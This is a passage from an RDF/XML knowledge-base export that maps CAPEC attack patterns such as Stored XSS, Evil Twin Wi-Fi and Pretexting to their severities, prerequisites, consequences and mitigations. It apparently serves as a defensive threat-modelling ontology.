                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack420">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#140">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:74::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Bypassing of Intermediate Forms in Multiple-Form Sets"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::372::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack173">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#272">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Protocol Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack28">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#554">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Functionality Bypass"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::424::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack182">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#629">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:114::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Unauthorized Use of Device Resources"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack348">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#433">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:427::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Target Influence via The Human Buffer Overflow"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack335">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#164">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:98::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Mobile Phishing"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack114">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#452">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:441::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Infected Hardware"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack306">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#438">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Modification During Manufacture"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack344">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#393">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:391::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Lock Picking"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
              </j.0:AttackPattern>
            </j.0:hasLikelihood>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Eavesdropping"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other The adversary gains unauthorized access to information.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Employ a robust network defense posture that includes an IDS/IPS system.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack195">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#301">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:300::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#TCP Connect Scan"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker404">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#619"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack404"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::201::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Commercial tools are available.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker8">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#615">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:616::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Evil Twin Wi-Fi Attack"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack8">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#615"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::300::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Intercept and control Wi-Fi data communications to/from mobile device.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::300::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::None::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker68">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#497">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity>
          <j.0:Severity rdf:about="http://krstProj.com/capec#Very Low"/>
        </j.0:hasSeverity>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#File Discovery"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack68">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#497"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must know the location of these common key files.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Strong physical security of all devices that contain secret key information. (even when devices are not in use)::Frequent changes to secret keys and certificates.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack375">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#625">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:624::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Mobile Device Fault Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access ControlTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Access Control Read Data Extract long-term secret keys (e.g. keys used for VPN or WiFi authentication and encryption) to enable decryption of intercepted VOIP traffic.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure the application is fully patched and does not allow the processing of unsigned data as if it is signed data.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack261">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#477">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:473::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Signature Spoofing by Mixing Signed and Unsigned Content"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::693::311::319::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::The only known mitigation to this attack is to avoid installing the malicious application on the device. However  the malicious application does need the GET_TASKS permission to be able to query the task list  and being suspicious of applications with that permission can help.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack21">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#504">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:173::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Task Impersonation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::1021::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use browser technologies that do not allow client-side scripting.::Utilize strict type  character  and encoding enforcement.::Ensure that all user-supplied input is validated before being stored.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack501">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#592">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:63::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Stored XSS"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::79::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data A successful Stored XSS attack can enable an adversary to exfiltrate sensitive information from the application.::SCOPE:Confidentiality:SCOPE:Authorization:SCOPE:Access ControlTECHNICAL IMPACT:Gain Privileges:NOTE:Confidentiality Authorization Access Control Gain Privileges A successful Stored XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands A successful Stored XSS attack can enable an adversary run arbitrary code of their choosing  thus enabling a complete compromise of the application.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data A successful Stored XSS attack can allow an adversary to tamper with application data.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker403">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#622">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:189::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Electromagnetic Side-Channel Attack"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack403">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#622"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::201::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Derive sensitive information about encrypted data. For mobile devices  depending on which keys are compromised  the attacker may be able to decrypt VOIP communications  impersonate the targeted caller  or access the enterprise VPN server.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::201::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Proximal access to the device.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Sophisticated attack  but detailed techniques published in the open literature.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker7">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#610">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:240::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cellular Data Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack7">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#610"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Attackers can disrupt or deny mobile technology communications and operations.::SCOPE:AvailabilityTECHNICAL IMPACT:Modify Data:NOTE:Availability Modify Data Attackers can inject false data into data or signaling system data flows of communications and operations  or re-route data flows or signaling data for the purpose of further data intercept and capture.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::None::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Often achieved by nation states in conjunction with commercial cellular providers to conduct cellular traffic intercept and possible traffic injection.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Inspect registry for changes. Limit privileges of user accounts so changes to default file handlers can only be performed by authorized administrators.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack509">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#556">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:542::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Replace File Extension Handlers"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker67">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#407">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:416::NATURE:ChildOf:CAPEC ID:410::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Pretexting"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack67">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#407"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Depending on the adversary&apos;s intentions and the specific nature their actions/requests  a successful pretexting attack can result in the compromise to the confidentiality of sensitive information in a variety of contexts.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the pretext that would influence the actions of the specific target.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Prior to performing CSS parsing  require the CSS to start with well-formed CSS when it is a cross-domain load and the MIME type is broken. This is a browser level fix. Implementation: Perform proper HTML encoding and URL escaping::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack288">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#468">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:242::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Generic Cross-Browser Cross-Domain Theft"/>
